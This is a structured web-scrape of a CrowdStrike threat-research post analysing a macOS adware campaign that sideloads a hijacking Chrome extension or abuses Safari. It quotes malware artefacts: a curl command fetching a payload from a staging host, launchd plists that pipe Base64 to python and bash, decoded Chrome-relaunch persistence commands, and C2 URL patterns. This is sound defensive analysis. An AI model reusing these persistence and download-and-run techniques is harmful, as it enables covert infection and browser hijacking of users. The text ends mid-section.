{
    "id": "<report_0xae1a99a2>",
    "url": "https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign",
    "title": "CrowdStrike Uncovers New MacOS Browser Hijacking Campaign",
    "meta": [],
    "chapters": [
        {
            "id": "<chapter_0xa0e4e4c2>",
            "title": "CrowdStrike Uncovers New MacOS Browser Hijacking Campaign",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x1383237e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "June 2, 2022",
                    "html": "<p>June 2, 2022</p>"
                },
                {
                    "id": "<sentence_0x5725dcac>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x1f4e5623>": "https://www.crowdstrike.com/blog/author/epp-content-research-team/"
                    },
                    "text": "EPP Content Research Team",
                    "html": "<a href=\"https://www.crowdstrike.com/blog/author/epp-content-research-team/\" rel=\"author\" title=\"Posts by EPP Content Research Team\">EPP Content Research Team</a>"
                },
                {
                    "id": "<sentence_0x647d68f3>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x901aaba2>": "https://www.crowdstrike.com/blog/category/endpoint-protection/"
                    },
                    "text": "Endpoint & Cloud Security",
                    "html": "<a href=\"https://www.crowdstrike.com/blog/category/endpoint-protection/\" title=\"Endpoint &amp; Cloud Security\">Endpoint &amp; Cloud Security</a>"
                },
                {
                    "id": "<sentence_0x26ac8786>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xdd2f4e7f>": "https://www.crowdstrike.com/wp-content/uploads/2022/06/Blog_1060x698-1-1-1.jpeg"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"attachment-post-thumbnail size-post-thumbnail wp-post-image\" height=\"698\" src=\"https://www.crowdstrike.com/wp-content/uploads/2022/06/Blog_1060x698-1-1-1.jpeg\" width=\"1060\"/>"
                },
                {
                    "id": "<sentence_0x8cf3d50d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x6101a7d9>": "https://www.crowdstrike.com/endpoint-security-products/falcon-platform/"
                    },
                    "text": "CrowdStrike analyzed a new browser hijacking campaign that targets MacOS<crlf>The purpose of the campaign is to inject ads into the users Chrome or Safari browser<crlf>The CrowdStrike Falcon platform provides continuous protection against browser hijacking threats by offering real-time visibility across workloads",
                    "html": "<ul>\n<li>CrowdStrike analyzed a new browser hijacking campaign that targets MacOS</li>\n<li>The purpose of the campaign is to inject ads into the user\u2019s Chrome or Safari browser </li>\n<li>The <a href=\"https://www.crowdstrike.com/endpoint-security-products/falcon-platform/\">CrowdStrike Falcon\u00ae platform</a> provides continuous protection against browser hijacking threats by offering real-time visibility across workloads</li>\n</ul>"
                },
                {
                    "id": "<sentence_0x9bcc409>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The CrowdStrike Content Research team recently analyzed a MacOS targeted browser hijacking campaign that modifies the users browsing experience to deliver ads. Research began with a variant that uses a combination of known techniques to deliver, persist and sideload a Chrome extension. Analysis of the fake Chrome installer uncovered the use of more than 40 unique dropper files to install the extension. During analysis of the original samples, an additional variant was discovered that targets Safari browser usage and employs a combination of AppleScript and Python to accomplish similar browser hijacking activity. At the time of writing, more than 15 unique dropper files have been found for this particular variant.",
                    "html": "<p>The CrowdStrike Content Research team recently analyzed a MacOS targeted browser hijacking campaign that modifies the user\u2019s browsing experience to deliver ads. Research began with a variant that uses a combination of known techniques to deliver, persist and sideload a Chrome extension. Analysis of the fake Chrome installer uncovered the use of more than 40 unique dropper files to install the extension. During analysis of the original samples, an additional variant was discovered that targets Safari browser usage and employs a combination of AppleScript and Python to accomplish similar browser hijacking activity. At the time of writing, more than 15 unique dropper files have been found for this particular variant.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xc06bdb94>",
            "title": "CrowdStrike Uncovers New MacOS Browser Hijacking Campaign",
            "title_level": 1,
            "sentences": []
        },
        {
            "id": "<chapter_0x2ded2043>",
            "title": "Technical Analysis",
            "title_level": 2,
            "sentences": []
        },
        {
            "id": "<chapter_0xb2064b1e>",
            "title": "Fake Chrome Installer",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x9b111ac5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The Chrome variant sideloads a malicious Chrome extension with the purpose of hijacking browser activity and delivering custom ad content.",
                    "html": "<p>The Chrome variant sideloads a malicious Chrome extension with the purpose of hijacking browser activity and delivering custom ad content. </p>"
                }
            ]
        },
        {
            "id": "<chapter_0x8f7b7074>",
            "title": "Installation",
            "title_level": 4,
            "sentences": [
                {
                    "id": "<sentence_0xd8c38cf>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The initial infection vector uses an Apple Disk Image (DMG) that masquerades as legitimate software and video files. Once the DMG file is mounted on the machine and the user is tricked into clicking the application icon, an install script is executed to initialize the setup process, as shown in Figure 1.",
                    "html": "<p>The initial infection vector uses an Apple Disk Image (DMG) that masquerades as legitimate software and video files. Once the DMG file is mounted on the machine and the user is tricked into clicking the application icon, an install script is executed to initialize the setup process, as shown in Figure 1.</p>"
                },
                {
                    "id": "<sentence_0xd4c9ccfd>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xcefc6dbf>": "https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure1.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"size-full wp-image-122835\" height=\"856\" src=\"https://www.crowdstrike.com/wp-content/uploads/2022/06/Figure1.png\" width=\"1316\"/>"
                },
                {
                    "id": "<sentence_0x7543e6d7>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 1. Example of DMG installation instructions",
                    "html": "<p class=\"wp-caption-text\" id=\"caption-attachment-122835\">Figure 1. Example of DMG installation instructions</p>"
                },
                {
                    "id": "<sentence_0x1d8400d9>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x38f59523>": "Application Installer",
                        "<code_0x5ed8e8af>": "installer.command",
                        "<code_0x6d8e4303>": "ChromeInstaller.command "
                    },
                    "text": "While the DMG file names are masquerading as software and video files, they all share a similarity and result in a mounted volume with the name Application Installer. The mounted volume prompts the user to execute an apparent Chrome installation application, but this is actually a malicious script file contained in the DMG. Early variants of this family used script files named installer.command. Later variants use ChromeInstaller.command script files.",
                    "html": "<p>While the DMG file names are masquerading as software and video files, they all share a similarity and result in a mounted volume with the name <code>Application Installer</code>. The mounted volume prompts the user to execute an apparent Chrome installation application, but this is actually a malicious script file contained in the DMG. Early variants of this family used script files named <code>installer.command</code>. Later variants use <code>ChromeInstaller.command </code>script files. </p>"
                },
                {
                    "id": "<sentence_0xb94969e8>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x370c9780>": "osascript ",
                        "<code_0xd08a557b>": "launchctl list | grep \"chrome.extension\"",
                        "<code_0xf41c04e4>": "launchd"
                    },
                    "text": "Upon initialization, the install script hides visible Terminal windows from the users view by leveraging osascript to conceal the installation actions. Then it makes a query for an existing infection by checking the results of launchctl list | grep \"chrome.extension\" and exits if the command returns any matching launchd jobs.",
                    "html": "<p>Upon initialization, the install script hides visible Terminal windows from the user\u2019s view by leveraging <code>osascript </code>to conceal the installation actions. Then it makes a query for an existing infection by checking the results of <code>launchctl list | grep \"chrome.extension\"</code> and exits if the command returns any matching <code>launchd</code> jobs. </p>"
                },
                {
                    "id": "<sentence_0x6298aab2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Prior to downloading the extension, an attempt is made to validate the returned status code from the web server using curl:",
                    "html": "<p>Prior to downloading the extension, an attempt is made to validate the returned status code from the web server using curl:</p>"
                },
                {
                    "id": "<sentence_0x2bfa015d>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x1a3f86c8>": "status_code=$(curl --write-out %{http_code} --head --silent --output /dev/null https[:]//ckgrounda[.]com/archive.zip )"
                    },
                    "text": "",
                    "html": "<code>status_code=$(curl --write-out %{http_code} --head --silent --output /dev/null https[:]//ckgrounda[.]com/archive.zip )</code>"
                },
                {
                    "id": "<sentence_0xd21ef40c>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x92e34019>": "/private/var/temp/[uuid].zip",
                        "<code_0x4749aa09>": "unzip",
                        "<code_0xdbbcd37b>": "/private/var/temp/"
                    },
                    "text": "If the return code is 200, curl is again used to download and write the archive file with the zipped payload written to /private/var/temp/[uuid].zip. The native unzip utility is used to expand the archive into a new folder also named with a random UUID in /private/var/temp/. Any other return code results in the script exiting.",
                    "html": "<p>If the return code is 200, curl is again used to download and write the archive file with the zipped payload written to <code>/private/var/temp/[uuid].zip</code>. The native <code>unzip</code> utility is used to expand the archive into a new folder also named with a random UUID in <code>/private/var/temp/</code>. Any other return code results in the script exiting. </p>"
                },
                {
                    "id": "<sentence_0xd031b867>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x80bf0be2>": "Application Installer",
                        "<code_0x4551ffda>": "SafariInstaller.command"
                    },
                    "text": "The Safari installer variant shares a similar delivery mechanism via DMGs with random names and the Application Installer volume name; however, all Safari DMGs have been observed to use script files with the naming convention SafariInstaller.command.",
                    "html": "<p>The Safari installer variant shares a similar delivery mechanism via DMGs with random names and the <code>Application Installer</code> volume name; however, all Safari DMGs have been observed to use script files with the naming convention <code>SafariInstaller.command</code>.</p>"
                },
                {
                    "id": "<sentence_0xb6cb85e6>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x40b2553b>": "SafariInstaller.command"
                    },
                    "text": "Much like the Chrome variant, the SafariInstaller.command files download their payload from statically defined staging servers. The response contains two Base64 data blobs that decode into Python code. These blobs are inserted directly into two plist files. Unlike the Chrome variant, the plist files pipe the Base64 decoded data to Python and then bash.",
                    "html": "<p>Much like the Chrome variant, the <code>SafariInstaller.command</code> files download their payload from statically defined staging servers. The response contains two Base64 data blobs that decode into Python code. These blobs are inserted directly into two plist files. Unlike the Chrome variant, the plist files pipe the Base64 decoded data to Python and then bash.</p>"
                },
                {
                    "id": "<sentence_0x1442d7c7>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x1b10d8b5>": "<key>ProgramArguments</key>\n<array>\n<string>sh</string>\n<string>-c</string>\n<string>echo aW1w -[ SNIP ]- kKQ== | base64 --decode | python | bash</string>\n</array>"
                    },
                    "text": "",
                    "html": "<code>&lt;key&gt;ProgramArguments&lt;/key&gt;\n&lt;array&gt;\n&lt;string&gt;sh&lt;/string&gt;\n&lt;string&gt;-c&lt;/string&gt;\n&lt;string&gt;echo aW1w -[ SNIP ]- kKQ== | base64 --decode | python | bash&lt;/string&gt;\n&lt;/array&gt;</code>"
                }
            ]
        },
        {
            "id": "<chapter_0xfd7fbc41>",
            "title": "Persistence",
            "title_level": 4,
            "sentences": [
                {
                    "id": "<sentence_0x3a933bae>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xa656f366>": "~/Library/LaunchAgent/"
                    },
                    "text": "The Chrome extension is installed and maintained by a number of plist files written to the user directory ~/Library/LaunchAgent/. To conceal the malicious behavior, the underlying commands in the plist files are obfuscated with Base64 encoding.",
                    "html": "<p>The Chrome extension is installed and maintained by a number of plist files written to the user directory <code>~/Library/LaunchAgent/</code>. To conceal the malicious behavior, the underlying commands in the plist files are obfuscated with Base64 encoding.</p>"
                },
                {
                    "id": "<sentence_0x79793fb>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xe38a156c>": "<key>ProgramArguments</key>\n<array>\n<string>sh</string>\n<string>-c</string>\n<string>echo aWYgcHMg -[ SNIP ]- Zmk= | base64 --decode | bash</string>\n</array>\n"
                    },
                    "text": "",
                    "html": "<code>&lt;key&gt;ProgramArguments&lt;/key&gt;\n&lt;array&gt;\n&lt;string&gt;sh&lt;/string&gt;\n&lt;string&gt;-c&lt;/string&gt;\n&lt;string&gt;echo aWYgcHMg -[ SNIP ]- Zmk= | base64 --decode | bash&lt;/string&gt;\n&lt;/array&gt;\n</code>"
                },
                {
                    "id": "<sentence_0xfaa984ac>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Below is a list of each file created, the Base64 decoded file contents and the description.",
                    "html": "<p>Below is a list of each file created, the Base64 decoded file contents and the description.</p>"
                },
                {
                    "id": "<sentence_0xccc373f7>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0x550476b1>": {
                            "0": {
                                "0": "StartInterval Values (seconds)",
                                "1": "com.chrome.extension.plist",
                                "2": "31",
                                "3": "com.chrome.extensions.plist",
                                "4": "21600",
                                "5": "com.chrome.extensionsPop.plist",
                                "6": "3600"
                            },
                            "1": {
                                "0": "Decoded Plist Payloads",
                                "1": "com.chrome.extension.plist",
                                "2": "if ps ax | grep -v grep | grep 'Google Chrome' &> /dev/null; then echo running; EXTENSION_SERVICE='Google Chrome --load-extension'; if ps ax | grep -v grep | grep 'Google Chrome --load-extension' &> /dev/null; then echo e running; else pkill -a -i 'Google Chrome'; sleep 1 ; open -a 'Google Chrome' --args --load-extension='/private/var/temp/[rand uuid]' --restore-last-session --noerrdialogs --disable-session-crashed-bubble; fi; else echo not running; fi",
                                "3": "com.chrome.extensions.plist",
                                "4": "pkill -a -i 'Google Chrome'; sleep 1 ; open -a 'Google Chrome' --args --load-extension='/private/var/temp/[rand uuid]' --restore-last-session --noerrdialogs --disable-session-crashed-bubble;",
                                "5": "com.chrome.extensionsPop.plist",
                                "6": "open -na 'Google Chrome' --args -load-extension='/private/var/temp/[rand uuid]' --new-window \"$https[:]//ationwindon[.]com/?tid=949115\""
                            },
                            "2": {
                                "0": "Description",
                                "1": "com.chrome.extension.plist",
                                "2": "Resolve/hide crashes",
                                "3": "com.chrome.extensions.plist",
                                "4": "Force the extension load",
                                "5": "com.chrome.extensionsPop.plist",
                                "6": "Ensure ad is always open"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table class=\"orange\">\n<tbody>\n<tr class=\"top-row bg-orange\">\n<td>StartInterval Values (seconds)</td>\n<td>Decoded Plist Payloads</td>\n<td>Description</td>\n</tr>\n<tr>\n<td colspan=\"3\"><code>com.chrome.extension.plist</code></td>\n</tr>\n<tr>\n<td>31</td>\n<td><code>if ps ax | grep -v grep | grep 'Google Chrome' &amp;&gt; /dev/null; then echo running; EXTENSION_SERVICE='Google Chrome --load-extension'; if ps ax | grep -v grep | grep 'Google Chrome --load-extension' &amp;&gt; /dev/null; then echo e running; else pkill -a -i 'Google Chrome'; sleep 1 ; open -a 'Google Chrome' --args --load-extension='/private/var/temp/[rand uuid]' --restore-last-session --noerrdialogs --disable-session-crashed-bubble; fi; else echo not running; fi</code></td>\n<td>Resolve/hide crashes</td>\n</tr>\n<tr>\n<td colspan=\"3\"><code>com.chrome.extensions.plist</code></td>\n</tr>\n<tr>\n<td>21600</td>\n<td><code>pkill -a -i 'Google Chrome'; sleep 1 ; open -a 'Google Chrome' --args --load-extension='/private/var/temp/[rand uuid]' --restore-last-session --noerrdialogs --disable-session-crashed-bubble;</code></td>\n<td>Force the extension load</td>\n</tr>\n<tr>\n<td colspan=\"3\"><code>com.chrome.extensionsPop.plist</code></td>\n</tr>\n<tr>\n<td>3600</td>\n<td><code>open -na 'Google Chrome' --args -load-extension='/private/var/temp/[rand uuid]' --new-window \"$https[:]//ationwindon[.]com/?tid=949115\"</code></td>\n<td>Ensure ad is always open</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0x7ca9f35>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "As shown above, the naming convention of the plist files attempts to evade general suspicion by masquerading as components of the Chrome browser.",
                    "html": "<p>As shown above, the naming convention of the plist files attempts to evade general suspicion by masquerading as components of the Chrome browser. </p>"
                },
                {
                    "id": "<sentence_0x20b10dd0>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xb29c6f6>": "StartInterval"
                    },
                    "text": "All of the Launch Agents utilize a StartInterval parameter. This means that each is executed periodically on its defined interval.",
                    "html": "<p>All of the Launch Agents utilize a <code>StartInterval</code> parameter. This means that each is executed periodically on its defined interval. </p>"
                },
                {
                    "id": "<sentence_0x49660d15>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x756ac4e8>": "com.chrome.extensionsPop.plist",
                        "<code_0xe59ce694>": "-load-extension",
                        "<code_0x2939f901>": "ationwindon[.]com"
                    },
                    "text": "Note that the com.chrome.extensionsPop.plist appears to have a typo in the -load-extension parameter; however, the command works as expected and is successful in sideloading the extension. A notable commonality across the variants analyzed is the check-in domain ationwindon[.]com.",
                    "html": "<p>Note that the <code>com.chrome.extensionsPop.plist</code> appears to have a typo in the \u201c<code>-load-extension</code>\u201d parameter; however, the command works as expected and is successful in sideloading the extension. A notable commonality across the variants analyzed is the check-in domain <code>ationwindon[.]com</code>. </p>"
                }
            ]
        },
        {
            "id": "<chapter_0xaa5affa5>",
            "title": "Extension Initialization",
            "title_level": 4,
            "sentences": [
                {
                    "id": "<sentence_0x561e8dd0>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xa4ff7f48>": "--load-extension"
                    },
                    "text": "The extension is sideloaded from disk via any of the plists using the --load-extension parameter. The extension utilizes a number of alarms and blocking listeners to facilitate its browser hijacking and ad content delivery.",
                    "html": "<p>The extension is sideloaded from disk via any of the plists using the <code>--load-extension</code> parameter. The extension utilizes a number of alarms and blocking listeners to facilitate its browser hijacking and ad content delivery.</p>"
                },
                {
                    "id": "<sentence_0xd9b0ba49>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xb83efe40>": "C2Domain",
                        "<code_0x1ed4aef2>": "ExtensionId"
                    },
                    "text": "The extension contains a hard-coded command-and-control (C2) domain referred to in this blog as C2Domain, and a unique identifying string defined as ExtensionId. These static values are used to reference the C2 domain and extension ID in the blog; however, each extension analyzed contained its own unique values.",
                    "html": "<p>The extension contains a hard-coded command-and-control (C2) domain referred to in this blog as <code>C2Domain</code>, and a unique identifying string defined as <code>ExtensionId</code>. These static values are used to reference the C2 domain and extension ID in the blog; however, each extension analyzed contained its own unique values. </p>"
                },
                {
                    "id": "<sentence_0xdeb94b5f>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x4ad894ae>": "localStorage",
                        "<code_0x24f8e9ab>": "expiry",
                        "<code_0xbacb6c37>": "expiry",
                        "<code_0xfed5d357>": "null",
                        "<code_0x1c5d40d6>": "localStorage"
                    },
                    "text": "The extension contains a system to provide time-dependent storage for ad content and dynamic parameters sent from the C2. This is accomplished by storing and retrieving JSON objects from Chromes localStorage. Key/Value pairs are stored with expiry value. Retrieved objects with an expiry value less than the current time are returned as null and removed from localStorage.",
                    "html": "<p>The extension contains a system to provide time-dependent storage for ad content and dynamic parameters sent from the C2. This is accomplished by storing and retrieving JSON objects from Chrome\u2019s <code>localStorage</code>. Key/Value pairs are stored with <code>expiry</code> value. Retrieved objects with an <code>expiry</code> value less than the current time are returned as <code>null</code> and removed from <code>localStorage</code>. </p>"
                },
                {
                    "id": "<sentence_0xa90d3fce>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Upon execution, the extension establishes two Chrome alarms: a heartbeat and an update frequency for ad content. The heartbeat alarm fires every three hours while the ad alarm triggers every 30 minutes. After configuring these parameters, the extension beacons to the C2 with a message signifying a successful install. It is sent using the following format:",
                    "html": "<p>Upon execution, the extension establishes two Chrome alarms: a heartbeat and an update frequency for ad content. The heartbeat alarm fires every three hours while the ad alarm triggers every 30 minutes. After configuring these parameters, the extension beacons to the C2 with a message signifying a successful install. It is sent using the following format:</p>"
                },
                {
                    "id": "<sentence_0x65496b6d>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xbb0e2e41>": "https://[C2Domain]/install?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]"
                    },
                    "text": "",
                    "html": "<code>https://[C2Domain]/install?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]</code>"
                },
                {
                    "id": "<sentence_0x4c71366d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x39dcd889>": "chrome.management.getAll()",
                        "<code_0xb3e5dd8e>": "ExtensionInfo[]"
                    },
                    "text": "Following the beacon and an initial heartbeat, the extension enumerates all installed extensions running in Chrome using a chrome.management.getAll() call. The ExtensionInfo[] response is sent as JSON in a POST message back to the C2 domain.",
                    "html": "<p>Following the beacon and an initial heartbeat, the extension enumerates all installed extensions running in Chrome using a <code>chrome.management.getAll()</code> call. The <code>ExtensionInfo[]</code> response is sent as JSON in a POST message back to the C2 domain.</p>"
                },
                {
                    "id": "<sentence_0x5b0fef0b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xed1516b1>": "chrome.management.setEnabled()"
                    },
                    "text": "The POST response contains a list of extensions IDs in a JSON list. These IDs are then used to disable extensions using chrome.management.setEnabled() API calls. This is done to remove extensions that conflict with the hijacking functionality.",
                    "html": "<p>The POST response contains a list of extensions IDs in a JSON list. These IDs are then used to disable extensions using <code>chrome.management.setEnabled()</code> API calls. This is done to remove extensions that conflict with the hijacking functionality. </p>"
                },
                {
                    "id": "<sentence_0xcee49e78>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xd2cb2c5d>": "searchSuggestEnabled"
                    },
                    "text": "As a final install step, the extension modifies a policy in Chrome to disable search suggestions by disabling the searchSuggestEnabled field. This also disables keyword search and autocompletion capabilities.",
                    "html": "<p>As a final install step, the extension modifies a policy in Chrome to disable search suggestions by disabling the <code>searchSuggestEnabled</code> field. This also disables keyword search and autocompletion capabilities. </p>"
                },
                {
                    "id": "<sentence_0xb232ef56>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x3edd8564>": "ExtensionId",
                        "<code_0x21572c76>": "requestHeader",
                        "<code_0x39858c18>": "rand",
                        "<code_0xe094c831>": "requestHeader",
                        "<code_0xbafec133>": "localStorage"
                    },
                    "text": "The first listener monitors web requests destined for the hardcoded C2 domain. Any requests to the domain are appended with the ExtensionId as a requestHeader. This additional request header serves to identify victims. Responses from this domain are also monitored for a randomness variable (rand) in the requestHeader. This randomness variable is stored in localStorage with an expiration time of 300 seconds. The randomness variable is used to provide inconsistency to the search hijacking functionality.",
                    "html": "<p>The first listener monitors web requests destined for the hardcoded C2 domain. Any requests to the domain are appended with the <code>ExtensionId</code> as a <code>requestHeader</code>. This additional request header serves to identify victims. Responses from this domain are also monitored for a randomness variable (<code>rand</code>) in the <code>requestHeader</code>. This randomness variable is stored in <code>localStorage</code> with an expiration time of 300 seconds. The randomness variable is used to provide inconsistency to the search hijacking functionality.</p>"
                },
                {
                    "id": "<sentence_0x89b0efe0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Hijack via a Blocking Listener",
                    "html": "<p>Hijack via a Blocking Listener</p>"
                },
                {
                    "id": "<sentence_0x831ba539>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xae953bf9>": "google.",
                        "<code_0xbb1cc95c>": "search.yahoo",
                        "<code_0xb31fba6>": "bing.",
                        "<code_0x239ad5cb>": "rand"
                    },
                    "text": "Next, the extension establishes a blocking listener to facilitate the search hijacking. This listener runs on outbound requests to URLs containing google., search.yahoo or bing.. If the requests contain search parameters, a random float value is generated between 0 and 100. If the random float is less than the rand variable, then the search request is redirected to the following URL:",
                    "html": "<p>Next, the extension establishes a blocking listener to facilitate the search hijacking. This listener runs on outbound requests to URLs containing \u201c<code>google.</code>\u201d, \u201c<code>search.yahoo</code>\u201d or \u201c<code>bing.</code>\u201d. If the requests contain search parameters, a random float value is generated between 0 and 100. If the random float is less than the <code>rand</code> variable, then the search request is redirected to the following URL:</p>"
                },
                {
                    "id": "<sentence_0x16c09844>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x5fbb1c2c>": "https://[C2Domain]/search?ext=[ExtensionName]&ver=[ExtensionVersion]&is=[OriginalSearchRedirectBoolean]&q=[OriginalSearchQuery]"
                    },
                    "text": "",
                    "html": "<code>https://[C2Domain]/search?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;is=[OriginalSearchRedirectBoolean]&amp;q=[OriginalSearchQuery]</code>"
                },
                {
                    "id": "<sentence_0xef58255c>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xe254f2d9>": "rand"
                    },
                    "text": "It can be theorized that the rand variable exists to evade users suspicion that their machines are infected. With it set, only a portion of a users web searches will be redirected.",
                    "html": "<p>It can be theorized that the <code>rand</code> variable exists to evade users\u2019 suspicion that their machines are infected. With it set, only a portion of a user\u2019s web searches will be redirected.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xafcc13b2>",
            "title": "Defense Evasion",
            "title_level": 4,
            "sentences": [
                {
                    "id": "<sentence_0xcfdc0f06>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x3fbe48ed>": "chrome://extensions",
                        "<code_0x53c3f25c>": "chrome://settings",
                        "<code_0xdd70f09f>": "onClicked",
                        "<code_0x9fd9ec2f>": "chrome://settings",
                        "<code_0x5307e4b3>": "UninstallURL"
                    },
                    "text": "The extension configures three techniques to evade discovery and deletion. The extension adds a listener for chrome://extensions, and any requests to that page will be redirected to chrome://settings. The extension configures onClicked actions so that a left or right-click on the extensions context menu will also open a tab to chrome://settings. Finally, if the user is able to bypass these barriers, the extension configures an UninstallURL so a tab to the following URL will be opened if the extension is successfully removed:",
                    "html": "<p>The extension configures three techniques to evade discovery and deletion. The extension adds a listener for <code>chrome://extensions</code>, and any requests to that page will be redirected to <code>chrome://settings</code>. The extension configures <code>onClicked</code> actions so that a left or right-click on the extension\u2019s context menu will also open a tab to <code>chrome://settings</code>. Finally, if the user is able to bypass these barriers, the extension configures an <code>UninstallURL</code> so a tab to the following URL will be opened if the extension is successfully removed:</p>"
                },
                {
                    "id": "<sentence_0xc27ca48e>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x3d464a57>": "https://[C2Domain]/uninstall?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]"
                    },
                    "text": "",
                    "html": "<code>https://[C2Domain]/uninstall?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]</code>"
                }
            ]
        },
        {
            "id": "<chapter_0xbead0613>",
            "title": "Core Functionality",
            "title_level": 4,
            "sentences": [
                {
                    "id": "<sentence_0xd910ba2b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The core functionality of the extension comes from its two alarms. These alarms run periodically to maintain the C2 heartbeat and update the delivered ad content.",
                    "html": "<p>The core functionality of the extension comes from its two alarms. These alarms run periodically to maintain the C2 heartbeat and update the delivered ad content. </p>"
                },
                {
                    "id": "<sentence_0x11aa667c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Heartbeat Alarm",
                    "html": "<p>Heartbeat Alarm</p>"
                },
                {
                    "id": "<sentence_0x38e6f34c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Every three hours, the heartbeat alarm makes a series of callouts to the C2. First, it makes a GET request to:",
                    "html": "<p>Every three hours, the heartbeat alarm makes a series of callouts to the C2. First, it makes a GET request to:</p>"
                },
                {
                    "id": "<sentence_0x9a77cc3c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xd8a60243>": "https://[C2Domain]/hb?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]"
                    },
                    "text": "",
                    "html": "<code>https://[C2Domain]/hb?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]</code>"
                },
                {
                    "id": "<sentence_0xb3fd0cb>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x2151c71>": "https://[C2Domain]/redsync"
                    },
                    "text": "This is followed by a GET request to https://[C2Domain]/redsync, and the response of this request is sent in a call to:",
                    "html": "<p>This is followed by a GET request to <code>https://[C2Domain]/redsync</code>, and the response of this request is sent in a call to:</p>"
                },
                {
                    "id": "<sentence_0x69011bfc>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x58995263>": "https://[C2Domain]/sync?ext=[ExtensionName]&ver=[ExtensionVersion]&dd=[ExtensionId]&info=[Response]"
                    },
                    "text": "",
                    "html": "<code>https://[C2Domain]/sync?ext=[ExtensionName]&amp;ver=[ExtensionVersion]&amp;dd=[ExtensionId]&amp;info=[Response]</code>"
                },
                {
                    "id": "<sentence_0xe713066c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The heartbeat and response do not influence the client-side code. The extension does not handle any fail requests or returned data. It just serves as a check-in to the C2 and is simply a notification of a live infection.",
                    "html": "<p>The heartbeat and response do not influence the client-side code. The extension does not handle any fail requests or returned data. It just serves as a check-in to the C2 and is simply a notification of a live infection. </p>"
                },
                {
                    "id": "<sentence_0xbf774d0a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Ad Alarm",
                    "html": "<p>Ad Alarm</p>"
                },
                {
                    "id": "<sentence_0x304510b5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The ad alarm runs every 30 minutes. Its objective is to ensure that the ad content is updated and running. To do this, it retrieves the ad object from the expiry storage. If it is expired, new ad content is loaded from:",
